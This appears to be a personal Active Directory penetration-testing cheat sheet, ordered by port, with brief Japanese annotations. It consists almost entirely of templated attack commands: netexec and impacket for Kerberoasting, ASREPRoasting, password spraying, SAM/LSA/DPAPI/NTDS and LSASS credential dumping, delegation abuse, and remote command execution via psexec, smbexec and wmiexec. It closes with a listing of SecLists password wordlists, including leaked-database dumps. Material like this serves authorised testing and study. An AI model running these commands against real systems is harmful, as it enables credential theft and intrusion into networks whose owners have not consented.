## 0
- `rustsvan -a 'IP' --no-banner --scripts none`
- `nmap -n -Pn -p- -sV 0.0.0.0 `


## 135
https://github.com/XiaoliChan/wmiexec-Pro

## 389
### netexec
```sh
# Authentication
netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
# Enumerate Domain Users
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export users.txt
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --active-users
# Enumerate Domain Groups
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
# Find Domain SID
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --get-sid
# ASREPRoast (TCP88番も必要)
netexec ldap 'IP' -u 'USERNAMELIST' -p '' --kdchost 'IP' --asreproast asreproast.txt
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --asreproast asreproast.txt
# Kerberoasting (TCP88番も必要)
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting kerberoast.txt
# Admin Count
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --admin-count
# Machine Account Quota
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M maq
# Get User Descriptions
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M get-desc-users
# Read DACL Rights
https://www.netexec.wiki/ldap-protocol/read-dacl-right
# Bloodhound Ingestor
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
# List DC IP / Enum Trust
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
```

### impacket
```sh
# kerberoasting (TCP88番も必要)
impacket-GetUserSPNs -outputfile kerberoast.txt -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
```


## 445 (139も)
(msrpcはTCP135番やDynamicPortも使う)
### donpapi
```sh
donpapi
```

### enum4linux-ng
```sh
enum4linux-ng -A -u 'USERNAME' -p 'PASSWORD' -t 'TIMEOUT' 'IP'
```

### impacket
```sh
impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows OR ShellBrowserWindow OR MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
```

### netexec
```sh
# Password Spraying
netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
# NTHASH
netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
# Spidering Shares
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' -M spider_plus
# Get and Put Files
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --get-file '/REMOTEPATH/./.' '/LOCALPATH/./.'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --put-file '/LOCALPATH/./.' '/REMOTEPATH/./.'
# Enumeration
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --interfaces
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --disks
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --shares
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --pass-pol
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --rid-brute
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --local-group
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export usres.txt
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --loggedon-users
# Obtaining Credentials
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --sam
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --lsa
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dpapi
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M ntdsutil
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M lsassy
and so on ...
# Checking for Spooler & WebDav
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spooler
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M webdav
# RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --delegate 'ADMINISTRAOR'
# S4U2Self
netexec smb 'IP' -u 'COMPUTERACCOUNT$' -H 'NTHASH' --delegate 'ADMINISTRAOR' --self
# exec
netexec smb 'IP' --share 'SHARENAME' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'smbexec' -x 'COMMAND'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'wmiexec' -x 'COMMAND'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x 'COMMAND'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
```

### smbclient
```sh
smbclient -L 'HOST' -U 'DOMAIN/USERNAME%PASSWORD'
smbclient -U 'DOMAIN/USERNAME%NT HASH' --pw-nt-hash -c 'COMMAND' '//HOST/SHARE'
```

### smbmap
```sh
smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -g smbmap.txt
smbmap -H 'IP or FQDN' -u 'USERNAME' -p 'PASSWORD or NTLM HASH' -d 'DOMAIN' -r 'Recursively FILE' --depth 'DEPTH' -g smbmap.txt
```



## link
https://github.com/kavika13/RemCom



## credentials
```sh
└─$ find /usr/share/seclists/Usernames -type f -exec wc -l {} +
    1000 /usr/share/seclists/Usernames/Names/malenames-usa-top1000.txt
    1000 /usr/share/seclists/Usernames/Names/familynames-usa-top1000.txt
    1000 /usr/share/seclists/Usernames/Names/femalenames-usa-top1000.txt
   10177 /usr/share/seclists/Usernames/Names/names.txt
    1000 /usr/share/seclists/Usernames/Names/forenames-india-top1000.txt
  624370 /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
     828 /usr/share/seclists/Usernames/cirt-default-usernames.txt
       1 /usr/share/seclists/Usernames/README.md
     113 /usr/share/seclists/Usernames/CommonAdminBase64.txt
      17 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
   26324 /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
      23 /usr/share/seclists/Usernames/sap-default-usernames.txt
 8295455 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
      10 /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt

                                                                                                                                                                                                                                            
└─$ find /usr/share/seclists/Passwords -type f -exec wc -l {} + 
   103979 /usr/share/seclists/Passwords/scraped-JWT-secrets.txt
  5189454 /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
    47603 /usr/share/seclists/Passwords/Most-Popular-Letter-Passes.txt
        4 /usr/share/seclists/Passwords/stupid-ones-in-production.txt
      399 /usr/share/seclists/Passwords/twitter-banned.txt
   100000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt
  3721224 /usr/share/seclists/Passwords/openwall.net-all.txt
    10000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
     3106 /usr/share/seclists/Passwords/Software/john-the-ripper.txt
   306706 /usr/share/seclists/Passwords/Software/cain-and-abel.txt
     3629 /usr/share/seclists/Passwords/unkown-azul.txt
       17 /usr/share/seclists/Passwords/README.md
  1000000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
   226928 /usr/share/seclists/Passwords/Leaked-Databases/honeynet-withcount.txt
     8930 /usr/share/seclists/Passwords/Leaked-Databases/hotmail.txt
       92 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt
   184364 /usr/share/seclists/Passwords/Leaked-Databases/phpbb-cleaned-up.txt
    97718 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_clean-combos.txt
     6163 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-45.txt
    87093 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_users.txt
    12570 /usr/share/seclists/Passwords/Leaked-Databases/bible.txt
   213627 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
     2351 /usr/share/seclists/Passwords/Leaked-Databases/hak5-withcount.txt
     8348 /usr/share/seclists/Passwords/Leaked-Databases/faithwriters-withcount.txt
    37144 /usr/share/seclists/Passwords/Leaked-Databases/myspace-withcount.txt
  3132006 /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
     1476 /usr/share/seclists/Passwords/Leaked-Databases/izmy.txt
    42660 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-70.txt
     3957 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt
   434923 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021.txt
    95072 /usr/share/seclists/Passwords/Leaked-Databases/muslimMatch.txt
    37126 /usr/share/seclists/Passwords/Leaked-Databases/myspace.txt
    38820 /usr/share/seclists/Passwords/Leaked-Databases/tuscl.txt
   226928 /usr/share/seclists/Passwords/Leaked-Databases/honeynet2.txt
   184389 /usr/share/seclists/Passwords/Leaked-Databases/phpbb-withcount.txt
     2506 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-35.txt
       11 /usr/share/seclists/Passwords/Leaked-Databases/README.md
    12233 /usr/share/seclists/Passwords/Leaked-Databases/singles.org.txt
     1904 /usr/share/seclists/Passwords/Leaked-Databases/carders.cc.txt
  3431316 /usr/share/seclists/Passwords/Leaked-Databases/md5decryptor-uk.txt
      512 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-20.txt
       13 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt
      100 /usr/share/seclists/Passwords/Leaked-Databases/adobe100.txt
    21040 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-60.txt
   212904 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-withcount.txt.tar.gz
     4064 /usr/share/seclists/Passwords/Leaked-Databases/youporn2012.txt
    11781 /usr/share/seclists/Passwords/Leaked-Databases/Lizard-Squad.txt
     1556 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt
     8089 /usr/share/seclists/Passwords/Leaked-Databases/porn-unknown-withcount.txt
    12234 /usr/share/seclists/Passwords/Leaked-Databases/singles.org-withcount.txt
    30289 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-65.txt
    12864 /usr/share/seclists/Passwords/Leaked-Databases/bible-withcount.txt
    14235 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-55.txt
     2351 /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt
      895 /usr/share/seclists/Passwords/Leaked-Databases/elitehacker-withcount.txt
     8345 /usr/share/seclists/Passwords/Leaked-Databases/faithwriters.txt
    95073 /usr/share/seclists/Passwords/Leaked-Databases/muslimMatch-withcount.txt
    78977 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_passwords.txt
   226081 /usr/share/seclists/Passwords/Leaked-Databases/honeynet.txt
     8088 /usr/share/seclists/Passwords/Leaked-Databases/porn-unknown.txt
     1437 /usr/share/seclists/Passwords/Leaked-Databases/NordVPN.txt
   375853 /usr/share/seclists/Passwords/Leaked-Databases/Ashley-Madison.txt
      249 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt
   184388 /usr/share/seclists/Passwords/Leaked-Databases/phpbb.txt
     4062 /usr/share/seclists/Passwords/Leaked-Databases/youporn2012-raw.txt
   720302 /usr/share/seclists/Passwords/Leaked-Databases/000webhost.txt
     9437 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
    59186 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
      895 /usr/share/seclists/Passwords/Leaked-Databases/elitehacker.txt
      929 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
        1 /usr/share/seclists/Passwords/der-postillon.txt
   100007 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
      173 /usr/share/seclists/Passwords/Common-Credentials/medical-devices.txt
     1575 /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-1575.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/SplashData-2015-2.txt
     1000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-1000.txt
   100000 /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
       15 /usr/share/seclists/Passwords/Common-Credentials/best15.txt
      101 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
      199 /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
       22 /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
        4 /usr/share/seclists/Passwords/Common-Credentials/README.md
    45012 /usr/share/seclists/Passwords/Common-Credentials/1900-2020.txt
      207 /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-207.txt
      100 /usr/share/seclists/Passwords/Common-Credentials/worst-passwords-2017-top100-slashdata.txt
  1000000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-1000000.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/four-digit-pin-codes-sorted-by-frequency-withcount.csv
    10000 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
     1000 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
      197 /usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/SplashData-2014.txt
     9999 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt
      815 /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt
      196 /usr/share/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt
   100000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-100000.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
     1049 /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
       25 /usr/share/seclists/Passwords/Common-Credentials/SplashData-2015-1.txt
   999998 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
      499 /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
      110 /usr/share/seclists/Passwords/Common-Credentials/best110.txt
       99 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-100.txt
      999 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt
      500 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Hebrew_Pwdb_common-password-list-top-150.txt
  1000000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-1000000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Ukranian_Pwdb_common-password-list-top-150.txt
  4106545 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Cantonese_Pwdb_common-password-list-top-150.txt
    19994 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/French-common-password-list-top-20000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Hindi_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Malay_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Lithuanian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Norwegian_Pwdb_common-password-list-top-150.txt
       32 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/README.md
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Thai_Pwdb_common-password-list-top-150.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-10000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Mandarin_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/French_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Greek_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Finnish_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Swedish_Pwdb_common-password-list-top-150.txt
    99999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-100000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Crotian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Italian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Japanese_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Hungarian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Latvian_Pwdb_common-password-list-top-150.txt
   525958 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_common-usernames-and-passwords.txt
      999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-1000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Polish_Pwdb_common-password-list-top-150.txt
  4322843 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Dutch_common-pasword-list.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Russian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Icelandic_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_Pwdb_common-password-list-top-150.txt
     1000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-1000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Turkish_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Indonesian_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Danish_Pwdb_common-password-list-top-150.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_Pwdb_common-password-list-top-150.txt
   999999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-1000000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Portugese_Pwdb_common-password-list-top-150.txt
  1834304 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list.txt
      716 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_1000-common-usernames-and-passwords.txt
   100000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Chinese-common-password-list-top-100000.txt
     9999 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/German_common-password-list-top-10000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Estonaian_Pwdb_common-password-list-top-150.txt
     5000 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/French-common-password-list-top-5000.txt
      150 /usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Slovak_Pwdb_common-password-list-top-150.txt
    12645 /usr/share/seclists/Passwords/Common-Credentials/probable-v2_top-12000.txt
 10000000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000000.txt
    10000 /usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt
       10 /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10.txt
     1041 /usr/share/seclists/Passwords/cirt-default-passwords.txt
      447 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top447.txt
     4800 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
       62 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top62.txt
       72 /usr/share/seclists/Passwords/Permutations/password-permutations.txt
     1134 /usr/share/seclists/Passwords/Permutations/1337speak.txt
     1152 /usr/share/seclists/Passwords/Permutations/korelogic-password.txt
    51286 /usr/share/seclists/Passwords/Honeypot-Captures/python-heralding-sep2019.txt
   105096 /usr/share/seclists/Passwords/Honeypot-Captures/multiplesources-passwords-fabian-fingerle.de.txt
       23 /usr/share/seclists/Passwords/Honeypot-Captures/Sucuri-Top-Wordpress-Passwords.txt
       10 /usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
    13431 /usr/share/seclists/Passwords/months.txt
     1000 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt
     5390 /usr/share/seclists/Passwords/seasons.txt
       46 /usr/share/seclists/Passwords/PHP-Hashes/Plaintext/plaintext.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger128,3.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv164.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval160,3.txt
        1 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/photon-160-36-36.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv1a64.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-88-80-8.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/ripemd128.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/murmur3c.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-88-176-88.txt
       63 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/sha1.txt
       20 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger128,4.txt
       16 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval128,5.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger160,3.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/murmur3f.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/crc32b.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/md4.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh3.txt
       21 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval128,4.txt
        3 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval160,5.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger192,3.txt
       25 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/sha224.txt
       12 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/sha256.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/murmur3a.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh128.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/photon-128-16-16.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/crc32.txt
        1 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-128-128-8.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/joaat.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv132.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/ripemd160.txt
       20 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/md2.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/spongent-128-256-128.txt
     1023 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/md5.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh64.txt
        3 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/photon-80-20-16.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval128,3.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/xxh32.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/tiger160,4.txt
       19 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/fnv1a32.txt
        1 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/quark-u-quark-136.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Floating-Comp/haval160,4.txt
        8 /usr/share/seclists/Passwords/PHP-Hashes/Truncated/descrypt.txt
        2 /usr/share/seclists/Passwords/PHP-Hashes/Truncated/bcrypt.txt
       49 /usr/share/seclists/Passwords/PHP-Hashes/README.md
        0 /usr/share/seclists/Passwords/PHP-Hashes/Pre-Hashed/pbkdf2-sha256.txt
        3 /usr/share/seclists/Passwords/PHP-Hashes/Pre-Hashed/pbkdf2-sha1.txt
        0 /usr/share/seclists/Passwords/PHP-Hashes/Pre-Hashed/pbkdf2-sha224.txt
    12877 /usr/share/seclists/Passwords/SCRABBLE-hackerhouse.tgz
       10 /usr/share/seclists/Passwords/xato-net-10-million-passwords-10.txt
        8 /usr/share/seclists/Passwords/500-worst-passwords.txt.bz2
      100 /usr/share/seclists/Passwords/xato-net-10-million-passwords-100.txt
     1761 /usr/share/seclists/Passwords/corporate_passwords.txt
      249 /usr/share/seclists/Passwords/Default-Credentials/Oracle EBS userlist.txt
      151 /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt
       76 /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
     1315 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
       41 /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt
      249 /usr/share/seclists/Passwords/Default-Credentials/Oracle EBS passwordlist.txt
     2875 /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/conceptronic_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/sagemcom_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/adb_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/iskratel_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/atlantis-land_default-passwords.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/vonage_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/inventel_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/legrand_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/bandluxe_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/cbn_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/aolynk_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/engenius_default-passwords.txt
        8 /usr/share/seclists/Passwords/Default-Credentials/Routers/d-link_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/airnet_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/calix_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/cisco_default-passwords.txt
        3 /usr/share/seclists/Passwords/Default-Credentials/Routers/zhone_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/3com_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/web-excel_default-passwords.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/paradyne_default-users.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/smc_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/icotera_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/ping-communication_default-users.txt
       12 /usr/share/seclists/Passwords/Default-Credentials/Routers/huawei_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pti_default-users.txt
        1 /usr/share/seclists/Passwords/Default-Credentials/Routers/aztech_default-users.txt
        2 /usr/share/seclists/Passwords/Default-Credentials/Routers/2wire_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/pronets_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/jaht_default-passwords.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/engenius_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/sonicwall_default-passwords.txt
        5 /usr/share/seclists/Passwords/Default-Credentials/Routers/linksys_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/topcom_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/starbridge_default-users.txt
        0 /usr/share/seclists/Passwords/Default-Credentials/Routers/humax_default-passwords.txt
